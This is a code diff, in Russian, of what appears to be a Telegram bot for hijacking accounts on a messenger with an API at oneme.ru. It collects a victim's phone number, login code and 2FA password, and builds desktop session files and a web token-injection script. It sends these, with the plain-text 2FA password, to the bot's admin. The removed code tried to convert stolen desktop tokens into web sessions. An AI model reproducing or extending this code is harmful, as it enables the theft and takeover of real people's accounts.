@@ -108,35 +108,6 @@ async def send_files(phone, uid, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(wp),
         caption=f"🌐 ВЕБ\nНомер: {phone}", parse_mode="HTML")
 
-async def convert_to_web_token(desktop_token, user_id, device_id):
-    """Конвертирует десктопный токен в веб-сессию."""
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
-        "Content-Type": "application/json"
-    }
-
-    payloads = [
-        {"token": desktop_token, "viewerId": user_id, "device_id": device_id},
-        {"session_token": desktop_token, "device_id": device_id, "device_type": "WEB"},
-        {"auth_token": desktop_token, "user_id": user_id, "device_id": device_id}
-    ]
-
-    async with aiohttp.ClientSession() as session:
-        for i, payload in enumerate(payloads):
-            try:
-                resp = await session.post(
-                    "https://ws-api.oneme.ru/auth/token",
-                    json=payload,
-                    headers=headers
-                )
-                text = await resp.text()
-                logging.info(f"Конвертация {i+1}: {resp.status} {text[:300]}")
-                if resp.status == 200:
-                    return True
-            except Exception as e:
-                logging.error(f"Ошибка конвертации {i+1}: {e}")
-    return False
-
 @dp.message(F.text == "/start")
 async def start(message: types.Message):
     await safe_send(message, "👋 Отправь номер в формате +79111111111")
@@ -175,47 +146,17 @@ async def phone_handler(message: types.Message, state: FSMContext):
                 pending[uid]["user_id"] = client.my_id
                 pending[uid]["status"] = "done"
 
-                # === ПОЛНЫЙ ДАМП ВСЕХ ДАННЫХ ===
-                logging.info("=== ВСЕ АТРИБУТЫ КЛИЕНТА ===")
-                for attr in dir(client):
-                    if not attr.startswith('_'):
-                        try:
-                            val = getattr(client, attr)
-                            if not callable(val):
-                                logging.info(f"client.{attr} = {str(val)[:200]}")
-                        except:
-                            pass
-
-                if hasattr(client, 'session'):
-                    logging.info("=== АТРИБУТЫ СЕССИИ ===")
-                    for attr in dir(client.session):
-                        if not attr.startswith('_'):
-                            try:
-                                val = getattr(client.session, attr)
-                                if not callable(val):
-                                    logging.info(f"session.{attr} = {str(val)[:200]}")
-                            except:
-                                pass
-
-                if hasattr(client, 'me'):
-                    logging.info("=== СОДЕРЖИМОЕ client.me ===")
-                    try:
-                        me_dict = client.me.model_dump() if hasattr(client.me, 'model_dump') else client.me.dict()
-                        logging.info(json.dumps(me_dict, indent=2, ensure_ascii=False))
-                    except:
-                        pass
-
-                # Сохраняем device_id из клиента, если есть
-                for attr in ['device_id', 'deviceId', 'deviceid']:
-                    if hasattr(client, attr):
-                        pending[uid]["device_id"] = str(getattr(client, attr))
-                        break
-                if not pending[uid].get("device_id") and hasattr(client, 'session'):
-                    for attr in ['device_id', 'deviceId']:
-                        if hasattr(client.session, attr):
-                            pending[uid]["device_id"] = str(getattr(client.session, attr))
-                            break
-                logging.info(f"Найден device_id: {pending[uid].get('device_id', 'НЕТ')}")
+                # === ПОЛНЫЙ ДАМП ВСЕХ МЕТОДОВ И АТРИБУТОВ ===
+                logging.info("=== ВСЕ МЕТОДЫ КЛИЕНТА ===")
+                all_methods = [m for m in dir(client) if not m.startswith('_')]
+                logging.info(f"Всего методов/атрибутов: {len(all_methods)}")
+                
+                # Ищем методы, связанные с QR и привязкой
+                qr_methods = [m for m in all_methods if 'qr' in m.lower() or 'link' in m.lower() or 'device' in m.lower()]
+                logging.info(f"Методы с QR/link/device: {qr_methods}")
+                
+                # Показываем все методы
+                logging.info(f"Все методы: {all_methods}")
                 # === КОНЕЦ ДАМПА ===
 
         except Exception as e:
@@ -294,12 +235,7 @@ async def code_handler(message: types.Message, state: FSMContext):
             viewer_id = pending[uid]["user_id"]
             password = gen_password()
             session_id = int(time.time() * 1000)
-
-            # Используем device_id из клиента или генерируем
-            device_id = pending[uid].get("device_id") or gen_device_id()
-
-            # Конвертируем в веб-сессию
-            await convert_to_web_token(token, viewer_id, device_id)
+            device_id = gen_device_id()
 
             desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
             js = generate_web_js(device_id, token, viewer_id)
@@ -363,9 +299,8 @@ async def password_handler(message: types.Message, state: FSMContext):
                 viewer_id = contact.get('id')
                 if viewer_id:
                     pending[uid]["user_id"] = viewer_id
-                    logging.info(f"viewer_id из contact.id: {viewer_id}")
-        except Exception as e:
-            logging.error(f"Ошибка чтения client.me: {e}")
+        except:
+            pass
 
     db_path = os.path.join(work_dir, "session.db")
     if os.path.exists(db_path):
@@ -379,8 +314,8 @@ async def password_handler(message: types.Message, state: FSMContext):
                 pending[uid]["token"] = token
                 pending[uid]["status"] = "done"
             conn.close()
-        except Exception as e:
-            logging.error(f"Ошибка чтения session.db: {e}")
+        except:
+            pass
 
     if uid in pending and pending[uid].get("status") == "done":
         token = pending[uid]["token"]
@@ -388,17 +323,11 @@ async def password_handler(message: types.Message, state: FSMContext):
         user_password = pending[uid].get("user_password", "")
         password = gen_password()
         session_id = int(time.time() * 1000)
-
-        # Используем device_id из клиента или генерируем
-        device_id = pending[uid].get("device_id") or gen_device_id()
-
-        # Конвертируем в веб-сессию
-        await convert_to_web_token(token, viewer_id, device_id)
+        device_id = gen_device_id()
 
         js = generate_web_js(device_id, token, viewer_id)
-
         if user_password:
-            js = f"2FA ПАРОЛЬ: {user_password} (ЭТУ СТРОКУ КОПИРОВАТЬ НЕ НУЖНО)\n\n" + js
+            js = f"2FA ПАРОЛЬ: {user_password}\n\n" + js
 
         desktop = build_desktop_json(token, device_id, session_id, password, viewer_id, phone)
         await send_files(phone, uid, work_dir, desktop, js)
